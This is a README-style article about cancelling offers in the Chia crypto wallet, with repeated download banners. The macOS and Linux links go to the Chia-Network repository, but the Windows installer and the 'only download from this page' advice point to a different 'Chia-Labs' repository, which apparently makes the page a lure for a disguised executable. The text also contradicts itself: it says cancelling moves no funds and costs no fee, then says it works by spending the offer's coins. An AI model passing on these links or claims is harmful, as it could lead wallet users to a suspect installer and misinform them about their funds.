<div align="center">

![Chia Wallet](../assets/banner-article.png)

</div>

<h1 align="center">How to cancel a chia offer</h1>

<p align="center">CATs, offers and NFTs, explained in order.</p>

<div align="center">

[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Windows-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF)](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-macOS-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=apple&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Linux-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=linux&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb)

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/OS-Windows-3EAC5C?style=flat-square&labelColor=424F6D&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`chia-wallet-setup-2.7.5.exe`](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) |
| <img src="https://img.shields.io/badge/OS-macOS-3EAC5C?style=flat-square&labelColor=424F6D&logo=apple&logoColor=FFFFFF" alt="macOS" height="24"> | macOS 12 or later | [`Chia-2.7.5-arm64.dmg`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) |
| <img src="https://img.shields.io/badge/OS-Linux-3EAC5C?style=flat-square&labelColor=424F6D&logo=linux&logoColor=FFFFFF" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`chia-blockchain_2.7.5_amd64.deb`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb) |

</div>

All versions and checksums are on the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5).

> Only download from this GitHub release page.

---

Cancel an offer from the offers screen while it is still untaken: select it and choose cancel, which withdraws it so it can no longer be accepted. Cancelling does not touch your funds and does not cost a fee. Once an offer has been taken, it cannot be cancelled - the trade is already settling.

## What cancelling does

Cancelling invalidates the offer you created, so a taker holding the file can no longer accept it. The wallet withdraws the offer's commitment on chain and returns the coins to normal spendable state. The offer file may still exist in a chat or a folder, but it will no longer work.

That is why cancelling is safe and free: it asserts a fact about your coins rather than moving them. [Expired offers in Chia Wallet](https://github.com/Chia-Labs/wallet-fixes/blob/main/articles/chia-offer-expired-or-not-taken.md) achieves the same result automatically at the deadline.

## Cancelling step by step

1. Open the wallet and confirm it is synced.
2. Go to the offers screen and find the active offer.
3. Select it and choose cancel.
4. Confirm, then wait for the status to change.
5. Check that your balance is back to normal.

If the offer does not appear in the list, it has probably already expired or been taken. A taken offer is a completed trade and there is nothing to cancel; an expired one needs nothing either.

## You cannot cancel a taken offer

This is the limit worth understanding before you create one. An offer is a signed trade, and once a taker accepts it the sequence is in motion: the coins are spent and the counterparty's side is committed. At that point, cancelling is not a slow operation - it is not an operation at all.

The protections you have are the ones set before creation: the terms, the price and the expiry. [Creating a chia offer in Chia Wallet](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/create-a-chia-offer-safely.md) covers those choices, and they are the only lever once the file is out.

## Why cancel at all

Three reasons are worth the click. The market moved and you no longer want the trade at that price. You shared the offer in the wrong place and want it dead before someone accepts it. Or you want to reuse the coins for something else, and an open offer tends to make the available balance look smaller than the total.

That last effect confuses people: an open offer can make some of your coins unavailable, and cancelling returns them. It is a display of commitment rather than a loss. [A zero balance](https://github.com/Chia-Labs/wallet-fixes/blob/main/articles/chia-wallet-balance-shows-zero.md) covers the related cases where the balance and the expectation disagree.

## If cancelling seems not to work

<div align="center">

| What you see | Meaning | Next step |
| --- | --- | --- |
| Status still active after cancel | The cancel has not settled yet | Wait, then recheck after a sync |
| Offer gone from the list | Expired or taken | Check history for the trade |
| Balance still short | Cancel has not been processed, or coins are elsewhere | Resync and recheck |
| Error on cancel | The offer may already be taken | Check the transaction history |

</div>

When the wallet's view disagrees with the chain, a resync re-derives the truth. [The Chia Wallet database repair](https://github.com/Chia-Labs/wallet-fixes/blob/main/articles/repair-a-corrupt-chia-wallet-database.md) is that procedure, and it is the right response to a status that will not settle.

## Cancelling versus letting it expire

Both end the offer; they differ in timing and in who acts. Cancelling is immediate and deliberate, and it suits a change of mind. Expiry is automatic and suits an offer you are happy to leave standing until the deadline, which defaults to seven days.

For anything where the price matters and the market is moving, cancelling early is the tidier choice: an offer that stands is an offer that can be taken at the wrong moment. [Expired offers in Chia Wallet](https://github.com/Chia-Labs/wallet-fixes/blob/main/articles/chia-offer-expired-or-not-taken.md) covers what the wallet shows afterwards.

## What a cancelled offer looks like to the other side

A taker holding your file will find it no longer works: the trade is refused rather than partially completed, and no funds move. That is worth saying plainly if you are in conversation with them, because from their side a cancellation looks like an error rather than an intention.

Nothing about the file itself changes, so an archive copy remains useful as a record. It simply stops being spendable, which is the same outcome an expiry produces without anyone clicking anything.

## Keeping offers manageable

Create offers with an expiry that matches how long you are willing to be exposed, and cancel the ones you no longer want rather than leaving them to rot in a chat. Run the current release from the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5), since offer status handling follows the release. [The Chia Wallet update guide](https://github.com/Chia-Labs/wallet-guides/blob/main/articles/update-chia-wallet-to-current-release.md) keeps the screens as described.

If you trade often, keep a note of what you offered and when. Keep the file beside your own notes anyway: it is the only document that ties a trade you cancelled to the coins it used, which is what makes a later reconciliation quick.

## What cancelling does not do

Cancelling works by spending the coins the offer would have used, which leaves the signed file valid in form and worthless in effect. It does not recall copies already shared: someone holding the old file can still inspect it, and any attempt to take it will fail because the coins are gone. That is why cancelling is safe to do immediately and why an old file should never be circulated as if it still worked.

## Frequently asked questions

### How do I cancel an offer?

Open the offers screen, select the untaken offer, choose cancel and confirm. The coins return to spendable state.

### Does cancelling an offer cost anything?

No fee. Cancelling withdraws the offer; it does not move funds.

### Can I cancel after someone took the offer?

No. Once taken, the trade is settling and the offer cannot be withdrawn.

### Why does my balance change when I cancel?

An open offer makes some coins unavailable. Cancelling or expiry returns them to the spendable balance.

### What if the offer is not in my list?

It has expired or been taken. Check the transaction history rather than looking for a cancel action.

---

## Download Chia Wallet

<div align="center">

[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Windows-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF)](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-macOS-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=apple&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Linux-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=linux&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb)

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/OS-Windows-3EAC5C?style=flat-square&labelColor=424F6D&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`chia-wallet-setup-2.7.5.exe`](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) |
| <img src="https://img.shields.io/badge/OS-macOS-3EAC5C?style=flat-square&labelColor=424F6D&logo=apple&logoColor=FFFFFF" alt="macOS" height="24"> | macOS 12 or later | [`Chia-2.7.5-arm64.dmg`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) |
| <img src="https://img.shields.io/badge/OS-Linux-3EAC5C?style=flat-square&labelColor=424F6D&logo=linux&logoColor=FFFFFF" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`chia-blockchain_2.7.5_amd64.deb`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb) |

</div>

All versions and checksums are on the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5).

> Only download from this GitHub release page.

---

## Related guides

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Offer expired or not taken](https://github.com/Chia-Labs/wallet-fixes/blob/main/articles/chia-offer-expired-or-not-taken.md) | The 7-day default, the fee at take time and the trade that lapsed. |
| [What is a mojo](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/chia-wallet-mojos-and-fees.md) | The smallest unit of XCH and how it becomes a transaction fee. |
| [Add a CAT token](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/add-a-cat-token-in-chia-wallet.md) | The asset ID, the token list and the CAT balance that appears. |
| [Send a CAT token](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/send-a-cat-token-from-chia-wallet.md) | Sending a token rather than XCH, and the fee that still applies. |

</div>
